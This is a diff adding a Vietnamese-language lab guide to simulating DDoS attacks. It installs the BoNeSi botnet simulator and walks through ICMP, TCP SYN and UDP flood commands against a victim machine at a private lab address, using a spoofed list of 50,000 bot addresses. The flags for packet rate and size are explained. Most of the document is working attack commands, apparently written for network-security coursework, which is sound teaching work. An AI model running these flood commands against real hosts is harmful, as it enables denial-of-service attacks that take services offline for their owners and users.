@@ -1,0 +1,44 @@
+﻿Chuẩn bị 2 máy tính (1 ubuntu 1 OS khác bất kì có dùng máy ảo)
+Phần 1: Tìm hiểu tấn công ddos (tài liệu đính kèm)
+1.Tấn công ddos TCPSYN
+2.Tấn công ddos ICMP
+3.Tấn công ddos UDP
+Phần 1:cài đặt bonesi trên máy ubuntu(hệ điều hành sử dụng được ubuntu)
+1.Cài đặt bonesi tool mô phỏng botnet để tấn công (máy tính 1)
+B1 : Tải bonesi về máy tính 
+sử dụng git để tải
+$git clone https://github.com/Markus-Go/bonesi
+or vào trang web https://github.com/Markus-Go/bonesi chọn mục "Clone or download" tải về
+B2: Gỉa nén bonesi (chú ý vào thư mục chứa file nén của bonesi)
+$tar -zxvf bonesi-master ( gõ bo rồi tab ra nhá)
+B3: vào thư mục bonesi để cài đặt
+$cd bonesi-master // vào thư mục bonesi
+$./configure      // tiến hành build 
+$ make             // tạo makefile
+$ make install     // cài đặt
+NOTE: nếu gặp lỗi missing + tên thư viên  thì lên mạng tìm thư viện rồi cài đặt  
+vd missing libpcap.h thì chạy lênh cài đặt thư viện sau 
+$sudo apt-get install libpcap0.8-dev 
+
+### Loi make erro 127 check: https://github.com/google/glog/issues/117
+B4: Kiểm tra 
+Thử gõ câu lệnh bonesi -h nếu hiện ra trợ giúp thì ok
+
+2.Setup máy victim (máy tính 2)
+B1: xem địa chỉ ip máy tính 
+trên window : ipconfig
+trên ubuntu: ifconfig
+B2: kiểm tra xem máy tính 1 thông máy tính 2 chưa 
+từ máy 1 gõ lệnh ping sang máy 2
+$ ping 192.168.10.120 (địa chỉ ip máy 2)
+3.Thử nghiệm tấn công với bonesi
+B1: vào thư mục bonesi
+B2: gõ lệnh 
+Tấn công icmp :$bonesi -i 50k-bots -d eth0 -p icmp -r 1000 -s 1400 192.168.10.120:22
+Tấn công tcpsyn:$bonesi -i 50k-bots -d eth0 -p tcp -r 1000  192.168.10.120:22
+Tấn công UDP:$bonesi -i 50k-bots -d eth0 -p udp -r 1000  192.168.10.120:22
+Giải thích câu lệnh -i 50k-bots : sử dụng list địa chỉ ip tấn công trong file 50k-bots	
+					-p icmp: chọn loại giao thức tấn công
+					-r 1000: số gói tin phát trong 1s
+					-s 1400: set size gói tin 
+					192.168.10.120:22  trong đó 192.168.10.120 là  địa chỉ ip victim(máy tính 2) 22 là port 
